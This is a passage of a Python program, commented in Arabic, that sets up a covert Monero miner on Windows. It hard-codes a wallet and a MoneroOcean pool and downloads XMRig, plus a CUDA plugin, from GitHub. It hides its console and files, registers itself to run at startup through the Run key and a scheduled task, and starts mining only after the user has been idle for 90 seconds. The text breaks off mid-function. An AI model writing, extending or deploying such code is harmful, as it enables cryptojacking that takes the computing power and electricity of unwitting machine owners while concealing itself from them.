import ctypes
import hashlib
import json
import logging
import os
import platform
import re
import shutil
import ssl
import subprocess
import sys
import tempfile
import threading
import time
import urllib.request
import zipfile

try:
    import certifi
    _HAS_CERTIFI = True
except ImportError:
    certifi = None
    _HAS_CERTIFI = False

_IS_WINDOWS = platform.system().lower() == "windows"

if _IS_WINDOWS:
    try:
        import winreg
        _HAS_WINREG = True
    except ImportError:
        winreg = None
        _HAS_WINREG = False
else:
    winreg = None
    _HAS_WINREG = False

try:
    import wmi
    _HAS_WMI = True
except ImportError:
    wmi = None
    _HAS_WMI = False

CREATE_NO_WINDOW = getattr(subprocess, "CREATE_NO_WINDOW", 0)
DETACHED_PROCESS = getattr(subprocess, "DETACHED_PROCESS", 0)
STARTF_USESHOWWINDOW = getattr(subprocess, "STARTF_USESHOWWINDOW", 0)
SW_HIDE = getattr(subprocess, "SW_HIDE", 0)

STARTUP_RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
STARTUP_VALUE_NAME = "XMRig_Runner"
STARTUP_TASK_NAME = "XMRig_Runner_Task"

# أسماء الأجهزة المحجوزة في ويندوز
_WIN_RESERVED = (
    {"CON", "PRN", "AUX", "NUL"}
    | {f"COM{i}" for i in range(1, 10)}
    | {f"LPT{i}" for i in range(1, 10)}
)


class _POINT(ctypes.Structure):
    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]


class _LASTINPUTINFO(ctypes.Structure):
    _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]


class MiningStage:
    IDLE = "Idle"
    PROCESS_STARTED = "Process started"
    POOL_CONNECTED = "Pool connected"
    JOB_RECEIVED = "Job received"
    SHARE_ACCEPTED = "Share accepted"
    # تُؤكَّد من لوحة المسبح/المحفظة وليس من العملية المحلية فقط
    BALANCE_CREDITED = "Balance credited (verify on pool)"


def _get_localappdata() -> str:
    return os.environ.get("LOCALAPPDATA") or os.path.join(
        os.path.expanduser("~"), "AppData", "Local"
    )


def _build_ssl_context() -> ssl.SSLContext:
    if _HAS_CERTIFI and certifi is not None:
        return ssl.create_default_context(cafile=certifi.where())
    return ssl.create_default_context()


CONFIG = {
    "wallet": "45cS8BbbF4sU7ErnUjcxUUWoQTFfYAE31Jmf4K4r7Cw7fctTxX9X8C11BVEBChm9M5TKHpTekxC7c8acozxqF1kQUF8Uomr",
    "pool": "gulf.moneroocean.stream:20128",
    "worker_name": os.getenv("COMPUTERNAME") or os.getenv("HOSTNAME") or "LOCAL_RIG",
    "cpu_intensity": 85,
    "gpu_intensity": 85,
    # انتظار دقيقة ونصف (90 ثانية) بدون أي حركة أو تدخل من الماوس أو الكيبورد قبل البدء
    "mouse_idle_start_seconds": 90,
    "mouse_poll_seconds": 0.5,
    "max_restart_attempts": 10,
    "restart_backoff_seconds": 5,
    "stable_runtime_seconds": 300,
    "startup_grace_seconds": 3,
    "xmrig_url": (
        "https://github.com/xmrig/xmrig/releases/download/"
        "v6.27.0/xmrig-6.27.0-windows-x64.zip"
    ),
    # بصمة SHA-256 الرسمية لملف الأرشيف xmrig-6.27.0-windows-x64.zip
    "xmrig_sha256": "9511d0a00da3e7474e81bd7fb12ad58a8c95853cbd51fdc198fd2a05b6b74f34",
    # بصمة SHA-256 المستقلة لملف xmrig.exe نفسه
    "xmrig_exe_sha256": "B4CB89DF0AAA03AEA57A4D91359C6A2CE6034B9ECC0C8D36F381E79D9B2B435C",
    # إعدادات إضافة NVIDIA CUDA الاختيارية لتفعيل تعدين GPU على كروت NVIDIA
    "enable_gpu_mining": True,
    "xmrig_cuda_url": None,
    "xmrig_cuda_sha256": None,
    "xmrig_cuda_dll_sha256": None,
    "auto_create_amd_icd": True,
    "auto_disable_failed_gpu": True,
    "auto_find_cuda_dll": True,
    "auto_download_cuda_plugin": True,
    "log_stats_interval_seconds": 60,
    "require_sha256": True,
    "max_download_bytes": 120 * 1024 * 1024,
    "min_download_bytes": 1 * 1024 * 1024,
    # حدود حماية فك الضغط (ZIP Bomb)
    "max_extracted_bytes": 250 * 1024 * 1024,
    "max_single_file_bytes": 180 * 1024 * 1024,
    "max_zip_members": 200,
    "max_zip_dirs": 50,
    "max_compression_ratio": 100.0,
    # إخفاء النوافذ والملفات والتشغيل التلقائي عند إقلاع الجهاز
    "hide_console": True,
    "hide_artifacts": True,
    "register_startup": True,
    "change_power_plan": False,
}

# استخدام مجلد واضح باسم المشروع بدل تقليد أسماء تعريفات النظام
WORK_DIR = os.path.join(_get_localappdata(), "XMRig_Workspace")
MINER_EXE = os.path.join(WORK_DIR, "xmrig.exe")
CUDA_PLUGIN_DLL = os.path.join(WORK_DIR, "xmrig-cuda.dll")
CONFIG_FILE = os.path.join(WORK_DIR, "config.json")
LOG_FILE = os.path.join(WORK_DIR, "miner.log")
XMRIG_LOG_FILE = os.path.join(WORK_DIR, "xmrig.log")

try:
    os.makedirs(WORK_DIR, exist_ok=True)
except OSError as e:
    if _IS_WINDOWS and CONFIG.get("hide_console"):
        sys.exit(4)
    print(f"FATAL: cannot create work directory {WORK_DIR}: {e}", file=sys.stderr)
    sys.exit(4)


def _hide_current_window():
    if not _IS_WINDOWS or not CONFIG.get("hide_console"):
        return
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, SW_HIDE)
    except Exception:
        pass


def _apply_hidden_attribute(path: str) -> bool:
    if not _IS_WINDOWS or not os.path.exists(path):
        return False
    invalid_attrs = 0xFFFFFFFF
    hidden_attr = 0x2
    try:
        get_attrs = ctypes.windll.kernel32.GetFileAttributesW
        get_attrs.restype = ctypes.c_uint32
        attrs = get_attrs(path)
        if attrs == invalid_attrs:
            return False
        if attrs & hidden_attr:
            return True
        ctypes.windll.kernel32.SetFileAttributesW(path, attrs | hidden_attr)
        confirmed = get_attrs(path)
        return confirmed != invalid_attrs and bool(confirmed & hidden_attr)
    except Exception:
        return False


def _setup_logging() -> logging.Logger:
    logger = logging.getLogger("xmrig_runner")
    logger.setLevel(logging.INFO)
    logger.handlers.clear()
    fmt = logging.Formatter("[%(asctime)s] %(levelname)s: %(message)s")
    try:
        fh = logging.FileHandler(LOG_FILE, encoding="utf-8")
        fh.setFormatter(fmt)
        logger.addHandler(fh)
    except Exception:
        pass
    if not (_IS_WINDOWS and CONFIG.get("hide_console")):
        sh = logging.StreamHandler(sys.stderr)
        sh.setFormatter(fmt)
        logger.addHandler(sh)
    return logger


_hide_current_window()
log = _setup_logging()

# التحقق من صيغة SHA-256 والتحقق من وجود البصمة مبكرًا
_SHA256_RE = re.compile(r"^[0-9a-fA-F]{64}$")


def calculate_sha256(path: str) -> str:
    digest = hashlib.sha256()
    with open(path, "rb") as file:
        for chunk in iter(lambda: file.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def _validate_config_or_die():
    sha = CONFIG.get("xmrig_sha256")
    require = CONFIG.get("require_sha256", True)
    if require:
        if not sha:
            log.error(
                "CONFIG['require_sha256']=True but CONFIG['xmrig_sha256'] is None.\n"
                "  -> Get the official SHA-256 for the target XMRig archive "
                "from the GitHub release page and put it in CONFIG['xmrig_sha256'].\n"
                "  -> Or set CONFIG['require_sha256']=False for trusted local testing."
            )
            sys.exit(5)
        if not _SHA256_RE.match(sha):
            log.error(f"CONFIG['xmrig_sha256'] is not a valid 64-char hex string: {sha!r}")
            sys.exit(6)
    elif sha and not _SHA256_RE.match(sha):
        log.warning(
            f"CONFIG['xmrig_sha256'] set but malformed ({sha!r}); ignoring verification."
        )
        CONFIG["xmrig_sha256"] = None

    exe_sha = CONFIG.get("xmrig_exe_sha256")
    if exe_sha and not _SHA256_RE.match(exe_sha):
        log.error(f"CONFIG['xmrig_exe_sha256'] is not a valid 64-char hex string: {exe_sha!r}")
        sys.exit(7)

    for key in ("xmrig_cuda_sha256", "xmrig_cuda_dll_sha256"):
        val = CONFIG.get(key)
        if val and not _SHA256_RE.match(val):
            log.error(f"CONFIG[{key!r}] is not a valid 64-char hex string: {val!r}")
            sys.exit(8)


class GPUMiner:
    def __init__(self):
        self.process = None
        self.gpu_type = None
        self.gpu_backend_active = False
        self.restart_count = 0
        self._terminate_timeout = 15
        self.stage = MiningStage.IDLE
        self.accepted_shares = 0
        self.rejected_shares = 0
        self.latest_hashrate = 'n/a'
        self._last_stats_log_at = 0.0
        self._opencl_disabled_by_failure = False
        self._cuda_disabled_by_failure = False
        self._log_thread = None
        self._stop_log_watch = threading.Event()
        self._session_marker = ""
        self._mining_started_at = None

    # -----------------------------------------------------------
    # قراءة موقع الماوس ومدة الخمول الحالية (ماوس أو كيبورد) في ويندوز
    # -----------------------------------------------------------
    @staticmethod
    def get_mouse_position() -> tuple[int, int] | None:
        if not _IS_WINDOWS:
            return None
        pt = _POINT()
        if ctypes.windll.user32.GetCursorPos(ctypes.byref(pt)):
            return (int(pt.x), int(pt.y))
        return None

    @staticmethod
    def get_idle_seconds() -> float | None:
        if not _IS_WINDOWS:
            return None
        lii = _LASTINPUTINFO()
        lii.cbSize = ctypes.sizeof(_LASTINPUTINFO)
        if not ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii)):
            return None

        get_tick_count64 = getattr(ctypes.windll.kernel32, "GetTickCount64", None)
        if get_tick_count64 is not None:
            get_tick_count64.restype = ctypes.c_ulonglong
            now_low32 = int(get_tick_count64()) & 0xFFFFFFFF
        else:
            ctypes.windll.kernel32.GetTickCount.restype = ctypes.c_uint32
            now_low32 = int(ctypes.windll.kernel32.GetTickCount()) & 0xFFFFFFFF

        last_low32 = int(lii.dwTime) & 0xFFFFFFFF
        elapsed_ms = (now_low32 - last_low32) & 0xFFFFFFFF
        return elapsed_ms / 1000.0

    # -----------------------------------------------------------
    # اكتشاف نوع كرت الشاشة
    # -----------------------------------------------------------
    def detect_gpu(self):
        if not _IS_WINDOWS:
            log.warning("GPU detection: non-Windows platform, skipping.")
            return None
        if _HAS_WMI:
            try:
                wmi_client = wmi.WMI()
                names = [g.Name or "" for g in wmi_client.Win32_VideoController()]
                for n in names:
                    up = n.upper()
                    if "NVIDIA" in up:
                        log.info(f"Display adapter detected via WMI: {n}")
                        return "NVIDIA"
                    if "AMD" in up or "RADEON" in up:
                        log.info(f"Display adapter detected via WMI: {n}")
                        return "AMD"
                log.warning(f"WMI video adapters found, none matched NVIDIA/AMD: {names}")
            except Exception as e:
                log.warning(f"WMI GPU detection failed: {e}")

        result = self._detect_gpu_fallback()
        if result is None:
            log.warning(
                "Display adapter detection: no NVIDIA/AMD adapter identified. "
                "RandomX mining relies on CPU."
            )
        return result

    def _detect_gpu_fallback(self):
        if not _IS_WINDOWS:
            return None
        tried = []
        for tool in ("nvidia-smi", "wmic"):
            if shutil.which(tool) is None:
                tried.append(f"{tool}=missing")
                continue
            try:
                cmd = (
                    [tool, "-L"]
                    if tool == "nvidia-smi"
                    else [tool, "path", "win32_VideoController", "get", "name"]
                )
                out = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=10,
                    creationflags=CREATE_NO_WINDOW,
                )
                txt = (out.stdout or "").upper()
                if "NVIDIA" in txt:
                    return "NVIDIA"
                if "AMD" in txt or "RADEON" in txt:
                    return "AMD"
                tried.append(f"{tool}=no-match")
            except Exception as e:
                tried.append(f"{tool}={e}")
        log.info(f"Fallback probe results: {tried}")
        return None

    # -----------------------------------------------------------
    # التحقق من سلامة xmrig.exe وإضافة CUDA
    # -----------------------------------------------------------
    @staticmethod
    def miner_exists() -> bool:
        try:
            if not os.path.isfile(MINER_EXE):
                return False
            if os.path.getsize(MINER_EXE) < 1_000_000:
                return False
            return True
        except OSError as e:
            log.error(f"Miner existence check failed: {e}")
            return False

    @staticmethod
    def _miner_ready() -> bool:
        if not GPUMiner.miner_exists():
            return False
        expected_exe_sha = CONFIG.get("xmrig_exe_sha256")
        if not expected_exe_sha:
            if CONFIG.get("require_sha256", True):
                log.warning(
                    "xmrig_exe_sha256 is not set; forcing fresh verified archive download/extraction."
                )
                return False
            return True
        try:
            actual_exe_sha = calculate_sha256(MINER_EXE)
            if actual_exe_sha.lower() != expected_exe_sha.lower():
                log.warning(
                    f"xmrig.exe SHA-256 mismatch (expected {expected_exe_sha[:12]}..., "
                    f"got {actual_exe_sha[:12]}...)"
                )
                return False
            return True
        except OSError as e:
            log.error(f"Miner SHA-256 verification failed: {e}")
            return False

    @staticmethod
    def _cuda_plugin_ready() -> bool:
        if not os.path.isfile(CUDA_PLUGIN_DLL):
            return False
        expected_dll_sha = CONFIG.get("xmrig_cuda_dll_sha256")
        if not expected_dll_sha:
            return True
        try:
            actual_dll_sha = calculate_sha256(CUDA_PLUGIN_DLL)
            if actual_dll_sha.lower() != expected_dll_sha.lower():
                log.warning(
                    f"xmrig-cuda.dll SHA-256 mismatch (expected {expected_dll_sha[:12]}..., "
                    f"got {actual_dll_sha[:12]}...)"
                )
                return False
            return True
        except OSError as e:
            log.error(f"CUDA plugin SHA-256 check failed: {e}")
            return False

    def _sync_artifact_visibility(self):
        if not _IS_WINDOWS or not CONFIG.get("hide_artifacts"):
            return
        for target in (
            WORK_DIR,
            MINER_EXE,
            CUDA_PLUGIN_DLL,
            CONFIG_FILE,
            LOG_FILE,
            XMRIG_LOG_FILE,
        ):
            if os.path.exists(target) and not _apply_hidden_attribute(target):
                log.warning(f"Hidden attribute not confirmed for {target}")

    def setup_environment(self) -> bool:
        if not _IS_WINDOWS:
            log.error("Setup refused: Windows-only build.")
            return False
        try:
            _hide_current_window()
            self._sync_artifact_visibility()

            if not self._miner_ready():
                self.download_miner()
            if not self._miner_ready():
                log.error("Miner binary missing or failed integrity check after setup")
                return False

            if self.gpu_type is None:
                self.gpu_type = self.detect_gpu()

            if CONFIG.get("enable_gpu_mining") and self.gpu_type == "NVIDIA":
                self._auto_acquire_cuda_plugin()

            self.create_config()
            if not os.path.isfile(CONFIG_FILE):
                log.error("Config file missing after setup")
                return False

            if CONFIG.get("register_startup"):
                if not self.add_to_startup():
                    log.warning("Startup registration failed - continuing")

            if CONFIG.get("change_power_plan"):
                self.optimize_system()

            self._sync_artifact_visibility()
            return True
        except Exception as e:
            log.error(f"Setup failed: {e}", exc_info=True)
            return False

    # -----------------------------------------------------------
    # استخراج يدوي آمن للأرشيف
    # -----------------------------------------------------------
    @staticmethod
    def _norm_path(p: str) -> str:
        return os.path.normcase(os.path.realpath(p))

    @staticmethod
    def _is_unsafe_zip_member(name: str) -> tuple:
        unified = name.replace("\\", "/")
        stripped = unified.rstrip("/")
        if not stripped:
            return True, "empty/root directory entry"
        if unified.startswith("/") or unified.startswith("\\"):
            return True, "absolute path"
        if len(unified) > 1 and unified[1] == ":":
            return True, "drive-letter prefix"
        parts = stripped.split("/")
        for part in parts:
            if part in ("", ".", ".."):
                return True, f"invalid path component {part!r}"
            if ":" in part:
                return True, f"alternate data stream {part!r}"
            if any(ord(c) < 32 for c in part):
                return True, f"control char in {part!r}"
            if part.rstrip(" .") != part:
                return True, f"trailing dot/space in {part!r}"
            base = part.split(".", 1)[0].upper()
            if base in _WIN_RESERVED:
                return True, f"reserved name {part!r}"
        return False, ""

    def _safe_extract(self, zf: zipfile.ZipFile, target_dir: str) -> None:
        root = self._norm_path(target_dir)
        os.makedirs(root, exist_ok=True)
        members = zf.infolist()
        max_members = int(CONFIG["max_zip_members"])
        max_dirs = int(CONFIG["max_zip_dirs"])
        max_total_bytes = int(CONFIG["max_extracted_bytes"])
        max_single_bytes = int(CONFIG["max_single_file_bytes"])
        max_ratio = float(CONFIG["max_compression_ratio"])

        if len(members) > max_members:
            raise RuntimeError(
                f"Zip member count ({len(members)}) exceeds limit ({max_members})"
            )

        dir_count = 0
        total_extracted = 0
        for member in members:
            bad, reason = self._is_unsafe_zip_member(member.filename)
            if bad:
                raise RuntimeError(f"Unsafe zip entry ({reason}): {member.filename!r}")
            unified = member.filename.replace("\\", "/")
            dest_path = os.path.abspath(os.path.join(root, unified))
            norm_dest = self._norm_path(dest_path)
            if norm_dest != root and not norm_dest.startswith(root + os.sep):
                raise RuntimeError(f"Zip entry escapes target: {member.filename!r}")
            mode = member.external_attr >> 16
            if mode and (mode & 0o170000) == 0o120000:
                raise RuntimeError(f"Symlink not allowed: {member.filename!r}")

            if member.is_dir() or unified.endswith("/"):
                dir_count += 1
                if dir_count > max_dirs:
                    raise RuntimeError(
                        f"Zip directory count ({dir_count}) exceeds limit ({max_dirs})"
                    )
                os.makedirs(dest_path, exist_ok=True)
                continue

            if member.file_size > max_single_bytes:
                raise RuntimeError(
                    f"Zip entry {member.filename!r} size ({member.file_size}) "
                    f"exceeds max_single_file_bytes ({max_single_bytes})"
                )
            if member.file_size > max_total_bytes:
                raise RuntimeError(
                    f"Zip entry {member.filename!r} size ({member.file_size}) "
                    f"exceeds max_extracted_bytes ({max_total_bytes})"
                )
            if member.compress_size > 0:
                ratio = member.file_size / member.compress_size
                if ratio > max_ratio:
                    raise RuntimeError(
                        f"Zip entry {member.filename!r} compression ratio "
                        f"({ratio:.1f}x) exceeds limit ({max_ratio}x)"
                    )

            parent_dir = os.path.dirname(dest_path)
            os.makedirs(parent_dir, exist_ok=True)
            written_for_member = 0
            with zf.open(member, "r") as src_stream, open(dest_path, "wb") as dst_stream:
                while True:
                    chunk = src_stream.read(1 << 16)
                    if not chunk:
                        break
                    written_for_member += len(chunk)
                    total_extracted += len(chunk)
                    if written_for_member > max_single_bytes:
                        raise RuntimeError(
                            f"Single file size exceeded {max_single_bytes} bytes for {member.filename!r}"
                        )
                    if total_extracted > max_total_bytes:
                        raise RuntimeError(
                            f"Total extracted size exceeded {max_total_bytes} bytes"
                        )
                    dst_stream.write(chunk)

    @staticmethod
    def _find_file_in_tree(extract_root: str, target_name: str) -> str | None:
        wanted = target_name.lower()
        for current_root, _, files in os.walk(extract_root):
            for fname in files:
                if fname.lower() == wanted:
                    return os.path.join(current_root, fname)
        return None

    # -----------------------------------------------------------
    # التنزيل والتحقق من البصمة مع دعم certifi
    # -----------------------------------------------------------
    def _download_to(self, url: str, dest: str) -> None:
        ssl_ctx = _build_ssl_context()
        opener = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=ssl_ctx)
        )
        max_bytes = CONFIG["max_download_bytes"]
        with opener.open(url, timeout=60) as r, open(dest, "wb") as out:
            total = 0
            while True:
                chunk = r.read(1 << 16)
                if not chunk:
                    break
                total += len(chunk)
                if total > max_bytes:
                    raise RuntimeError(f"Download exceeded {max_bytes} bytes; aborting")
                out.write(chunk)
        if total < CONFIG["min_download_bytes"]:
            raise RuntimeError(f"Download too small ({total} bytes); likely truncated")

    def download_miner(self):
        if not _IS_WINDOWS:
            raise RuntimeError("Windows-only miner")
        expected_zip_sha = CONFIG.get("xmrig_sha256")
        if CONFIG.get("require_sha256") and not expected_zip_sha:
            raise RuntimeError("Refusing to download: xmrig_sha256 is not configured.")
        if expected_zip_sha and not _SHA256_RE.match(expected_zip_sha):
            raise RuntimeError(f"xmrig_sha256 is not valid hex-64: {expected_zip_sha!r}")

        expected_exe_sha = CONFIG.get("xmrig_exe_sha256")
        if expected_exe_sha and not _SHA256_RE.match(expected_exe_sha):
            raise RuntimeError(f"xmrig_exe_sha256 is not valid hex-64: {expected_exe_sha!r}")

        temp_dir = tempfile.mkdtemp(prefix="xmrig_dl_")
        try:
            zip_path = os.path.join(temp_dir, "xmrig.zip")
            self._download_to(CONFIG["xmrig_url"], zip_path)

            if expected_zip_sha:
                actual_zip_sha = calculate_sha256(zip_path)
                if actual_zip_sha.lower() != expected_zip_sha.lower():
                    raise RuntimeError(
                        f"Archive SHA-256 mismatch (expected {expected_zip_sha[:12]}..., "
                        f"got {actual_zip_sha[:12]}...)"
                    )

            if not zipfile.is_zipfile(zip_path):
                raise RuntimeError("Not a valid zip")
            with zipfile.ZipFile(zip_path, "r") as zf:
                bad = zf.testzip()
                if bad is not None:
                    raise RuntimeError(f"Corrupt zip member: {bad}")
                self._safe_extract(zf, temp_dir)

            src = self._find_file_in_tree(temp_dir, "xmrig.exe")
            if not src or not os.path.isfile(src):
                raise FileNotFoundError(f"xmrig.exe not found inside extracted archive: {temp_dir}")

            actual_exe_sha = calculate_sha256(src)
            if expected_exe_sha:
                if actual_exe_sha.lower() != expected_exe_sha.lower():
                    raise RuntimeError(
                        f"Extracted xmrig.exe SHA-256 mismatch (expected {expected_exe_sha[:12]}..., "
                        f"got {actual_exe_sha[:12]}...)"
                    )
            else:
                CONFIG["xmrig_exe_sha256"] = actual_exe_sha
                log.info(f"Recorded extracted xmrig.exe SHA-256: {actual_exe_sha}")

            shutil.copy2(src, MINER_EXE)
            if CONFIG.get("hide_artifacts"):
                self.hide_file(MINER_EXE)
            log.info(f"Miner downloaded and verified from {src}")
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)

    def download_cuda_plugin(self):
        cuda_url = CONFIG.get("xmrig_cuda_url")
        if not cuda_url:
            return
        expected_cuda_zip_sha = CONFIG.get("xmrig_cuda_sha256")
        if CONFIG.get("require_sha256") and not expected_cuda_zip_sha:
            raise RuntimeError("Refusing to download CUDA plugin: xmrig_cuda_sha256 is not set.")

        temp_dir = tempfile.mkdtemp(prefix="xmrig_cuda_")
        try:
            zip_path = os.path.join(temp_dir, "xmrig-cuda.zip")
            self._download_to(cuda_url, zip_path)

            if expected_cuda_zip_sha:
                actual_zip_sha = calculate_sha256(zip_path)
                if actual_zip_sha.lower() != expected_cuda_zip_sha.lower():
                    raise RuntimeError(
                        f"CUDA archive SHA-256 mismatch (expected {expected_cuda_zip_sha[:12]}..., "
                        f"got {actual_zip_sha[:12]}...)"
                    )

            with zipfile.ZipFile(zip_path, "r") as zf:
                bad = zf.testzip()
                if bad is not None:
                    raise RuntimeError(f"Corrupt CUDA zip member: {bad}")
                self._safe_extract(zf, temp_dir)

            src_dll = self._find_file_in_tree(temp_dir, "xmrig-cuda.dll")
            if not src_dll or not os.path.isfile(src_dll):
                raise FileNotFoundError("xmrig-cuda.dll not found inside CUDA archive")

            expected_dll_sha = CONFIG.get("xmrig_cuda_dll_sha256")
            actual_dll_sha = calculate_sha256(src_dll)
            if expected_dll_sha and actual_dll_sha.lower() != expected_dll_sha.lower():
                raise RuntimeError(
                    f"xmrig-cuda.dll SHA-256 mismatch (expected {expected_dll_sha[:12]}..., "
                    f"got {actual_dll_sha[:12]}...)"
                )

            shutil.copy2(src_dll, CUDA_PLUGIN_DLL)
            if CONFIG.get("hide_artifacts"):
                self.hide_file(CUDA_PLUGIN_DLL)
            log.info(f"CUDA plugin installed and verified at {CUDA_PLUGIN_DLL}")
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)

    # -----------------------------------------------------------
    # تلقائية OpenCL و CUDA والتعطيل التلقائي للكرت الفاشل
    # -----------------------------------------------------------
    @staticmethod
    def _find_amd_opencl_library() -> str | None:
        if not _IS_WINDOWS:
            return None
        sys_root = os.environ.get("SystemRoot", r"C:\Windows")
        candidate_names = ("amdocl64.dll", "amdocl128.dll", "amdocl.dll")
        sys32_dir = os.path.join(sys_root, "System32")
        for fname in candidate_names:
            candidate = os.path.join(sys32_dir, fname)
            if os.path.isfile(candidate):
                return candidate

        driver_repo = os.path.join(sys32_dir, "DriverStore", "FileRepository")
        if os.path.isdir(driver_repo):
            try:
                for root, _, files in os.walk(driver_repo):
                    for fname in files:
                        if fname.lower() in candidate_names:
                            return os.path.join(root, fname)
            except OSError:
                pass
        return None

    def _ensure_opencl_icd_if_needed(self, icd_dir: str) -> bool:
        if not CONFIG.get("auto_create_amd_icd", True):
            return False
        amd_dll = self._find_amd_opencl_library()
        if not amd_dll:
            return False
        try:
            os.makedirs(icd_dir, exist_ok=True)
            icd_file = os.path.join(icd_dir, "amd_auto.icd")
            with open(icd_file, "w", encoding="utf-8") as f:
                f.write(amd_dll + "\n")
            if CONFIG.get("hide_artifacts"):
                _apply_hidden_attribute(icd_file)
            log.info(f"Created AMD OpenCL ICD automatically at {icd_file} -> {amd_dll}")
            return True
        except Exception as e:
            log.warning(f"Failed to create amd_auto.icd automatically: {e}")
            return False

    def _has_opencl_runtime_files(self) -> bool:
        if not _IS_WINDOWS:
            return False
        if getattr(self, "_opencl_disabled_by_failure", False):
            return False
        sysdir = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32")
        loader = os.path.join(sysdir, "OpenCL.dll")
        icd_dir = os.path.join(
            os.environ.get("ProgramData", r"C:\ProgramData"),
            "Khronos",
            "OpenCL",
            "vendors",
        )
        if not os.path.isfile(loader):
            return False
        has_icd = False
        if os.path.isdir(icd_dir):
            try:
                has_icd = any(f.lower().endswith(".icd") for f in os.listdir(icd_dir))
            except OSError:
                has_icd = False
        if not has_icd:
            has_icd = self._ensure_opencl_icd_if_needed(icd_dir)
        return has_icd

    @staticmethod
    def _find_local_cuda_dll() -> str | None:
        search_dirs = [
            WORK_DIR,
            os.getcwd(),
            os.path.join(os.path.expanduser("~"), "Downloads"),
            os.path.join(os.path.expanduser("~"), "Desktop"),
            os.path.join(_get_localappdata(), "Programs"),
        ]
        for base in search_dirs:
            if not base or not os.path.isdir(base):
                continue
            direct = os.path.join(base, "xmrig-cuda.dll")
            if os.path.isfile(direct):
                return direct
            try:
                for entry in os.listdir(base):
                    sub = os.path.join(base, entry)
                    if "xmrig" in entry.lower() and os.path.isdir(sub):
                        found = GPUMiner._find_file_in_tree(sub, "xmrig-cuda.dll")
                        if found:
                            return found
            except OSError:
                pass
        return None

    def _discover_github_cuda_urls(self) -> list[str]:
        urls: list[str] = []
        base_url = str(CONFIG.get("xmrig_url") or "")
        match = re.search(r"/download/(v[^/]+)/", base_url)
        if match:
            tag = match.group(1)
            ver = tag.lstrip("v")
            urls.extend(
                [
                    f"https://github.com/xmrig/xmrig-cuda/releases/download/{tag}/xmrig-cuda-{ver}-cuda12_4-win64.zip",
                    f"https://github.com/xmrig/xmrig-cuda/releases/download/{tag}/xmrig-cuda-{ver}-cuda11_8-win64.zip",
                ]
            )
        urls.extend(
            [
                "https://github.com/xmrig/xmrig-cuda/releases/download/v6.21.1/xmrig-cuda-6.21.1-cuda12_4-win64.zip",
                "https://github.com/xmrig/xmrig-cuda/releases/download/v6.21.1/xmrig-cuda-6.21.1-cuda11_8-win64.zip",
            ]
        )
        deduped: list[str] = []
        for u in urls:
            if u not in deduped:
                deduped.append(u)
        return deduped

    def _auto_acquire_cuda_plugin(self) -> bool:
        if getattr(self, "_cuda_disabled_by_failure", False):
            return False
        if self._cuda_plugin_ready():
            return True

        if CONFIG.get("auto_find_cuda_dll", True):
            local_dll = self._find_local_cuda_dll()
            if local_dll and os.path.abspath(local_dll) != os.path.abspath(CUDA_PLUGIN_DLL):
                try:
                    shutil.copy2(local_dll, CUDA_PLUGIN_DLL)
                    if CONFIG.get("hide_artifacts"):
                        self.hide_file(CUDA_PLUGIN_DLL)
                    log.info(f"Found local xmrig-cuda.dll at {local_dll} -> copied to {CUDA_PLUGIN_DLL}")
                    if self._cuda_plugin_ready():
                        return True
                except Exception as e:
                    log.warning(f"Failed copying local xmrig-cuda.dll: {e}")

        if CONFIG.get("xmrig_cuda_url"):
            try:
                self.download_cuda_plugin()
                if self._cuda_plugin_ready():
                    return True
            except Exception as e:
                log.warning(f"Configured xmrig_cuda_url failed: {e}")

        if not CONFIG.get("auto_download_cuda_plugin", True):
            return False

        expected_zip_sha = CONFIG.get("xmrig_cuda_sha256")
        expected_dll_sha = CONFIG.get("xmrig_cuda_dll_sha256")
        if CONFIG.get("require_sha256") and not expected_zip_sha and not expected_dll_sha:
            log.warning(
                "Skipping automatic GitHub CUDA download because require_sha256=True and no CUDA SHA-256 is set."
            )
            return False

        for url in self._discover_github_cuda_urls():
            temp_dir = tempfile.mkdtemp(prefix="xmrig_cuda_auto_")
            try:
                zip_path = os.path.join(temp_dir, "xmrig-cuda.zip")
                self._download_to(url, zip_path)
                if expected_zip_sha:
                    actual_zip_sha = calculate_sha256(zip_path)
                    if actual_zip_sha.lower() != expected_zip_sha.lower():
                        log.warning(f"CUDA archive SHA-256 mismatch from {url}; trying next.")
                        continue
                if not zipfile.is_zipfile(zip_path):
                    continue
                with zipfile.ZipFile(zip_path, "r") as zf:
                    if zf.testzip() is not None:
                        continue
                    self._safe_extract(zf, temp_dir)
                src_dll = self._find_file_in_tree(temp_dir, "xmrig-cuda.dll")
                if not src_dll or not os.path.isfile(src_dll):
                    continue
                if expected_dll_sha:
                    actual_dll_sha = calculate_sha256(src_dll)
                    if actual_dll_sha.lower() != expected_dll_sha.lower():
                        log.warning(f"xmrig-cuda.dll SHA-256 mismatch from {url}; trying next.")
                        continue
                shutil.copy2(src_dll, CUDA_PLUGIN_DLL)
                if CONFIG.get("hide_artifacts"):
                    self.hide_file(CUDA_PLUGIN_DLL)
                log.info(f"Automatically installed CUDA plugin from {url} -> {CUDA_PLUGIN_DLL}")
                return True
            except Exception as e:
                log.warning(f"CUDA auto-download attempt failed ({url}): {e}")
            finally:
                shutil.rmtree(temp_dir, ignore_errors=True)

        return False

    def _resolve_active_xmrig_log_file(self) -> str:
        fallback_log = os.path.join(WORK_DIR, "xmrig_worker.log")
        try:
            with open(XMRIG_LOG_FILE, "a", encoding="utf-8"):
                pass
            return XMRIG_LOG_FILE
        except PermissionError:
            log.warning(
                f"XMRIG_LOG_FILE locked ({XMRIG_LOG_FILE}); switching active log to {fallback_log}"
            )
            try:
                with open(fallback_log, "a", encoding="utf-8"):
                    pass
            except Exception:
                pass
            return fallback_log

    def _disable_failed_gpu_backend(self, backend: str, reason: str) -> None:
        if not CONFIG.get("auto_disable_failed_gpu", True):
            return
        b_low = backend.lower()
        if b_low == "opencl":
            if getattr(self, "_opencl_disabled_by_failure", False):
                return
            self._opencl_disabled_by_failure = True
        elif b_low == "cuda":
